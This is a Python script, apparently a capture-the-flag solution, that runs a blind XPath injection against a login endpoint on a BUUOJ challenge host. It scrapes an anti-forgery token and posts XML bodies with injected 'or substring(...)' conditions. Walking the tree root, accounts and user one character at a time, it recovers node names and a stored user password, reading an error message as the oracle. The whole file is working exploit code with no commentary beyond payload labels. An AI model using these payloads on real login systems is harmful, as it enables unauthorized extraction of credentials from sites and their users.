# -*- coding: GB2312 -*-
import requests
import re
import time
sess=requests.session()
url="http://eaeeb3c7-6680-471c-8945-540f83160304.node4.buuoj.cn:81/"
header={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Content-Type": "application/xml"
    }
find=re.compile('<input type="hidden" id="token" value="(.*?)" />')#进行贪心匹配token的值
strs="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
flag=''
for i in range(1,100):
    for j in strs:
            time.sleep(0.2)
            r=sess.post(url=url)
            token=find.findall(r.text)#找到token的值赋值给token在后面进行格式化字符串
            payload_1="<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>123</password><token>{}</token>".format(i,j,token[0])
            #root
            payload_2="<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>123</password><token>{}</token>".format(i,j,token[0])
            #accounts
            payload_3="<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>123</password><token>{}</token>".format(i,j,token[0])
            #user
            payload_4="<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>123</password><token>{}</token>".format(i,j,token[0])
            #username
            payload_5="<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>123</password><token>{}</token>".format(i,j,token[0])
            r=sess.post(url=url,headers=header,data=payload_5)
            print(r.text)
            if"非法操作" in r.text:
                flag+=j
                print(flag)
                break
    if"用户名或密码错误!" in r.text:
                break
print(flag)
